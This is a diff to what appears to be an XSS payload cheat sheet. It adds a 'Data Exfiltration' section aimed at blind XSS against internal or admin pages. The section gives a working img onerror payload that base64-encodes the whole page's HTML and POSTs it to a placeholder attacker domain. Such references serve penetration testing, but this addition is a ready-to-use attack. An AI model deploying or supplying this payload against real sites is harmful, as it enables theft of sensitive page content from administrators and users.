@@ -5,6 +5,7 @@
 - [Chaining with CSRF](#chaining-with-csrf)
 - [WEB API abusing](#web-api-abusing)
 - [Content Spoofing](#content-spoofing)
+- [Data Exfiltration](#data-exfiltration)
 
 ## Credential stealing
 
@@ -105,3 +106,12 @@
    `;
    </script>
    ```
+
+## Data Exfiltration
+
+### Sensitive data on the page can be exfiltrated. This is especially useful in Blind XSS scenarios, where an attacker can capture the contents of an internal or administrative page they cannot see directly.
+
+- Exfiltrating page content
+    ```html
+    <img src=nonexistent_src onerror=fetch('https://[ATTACKER-DOMAIN]',{method:'POST',body:btoa(unescape(encodeURIComponent(document.documentElement.outerHTML)))})>
+    ```
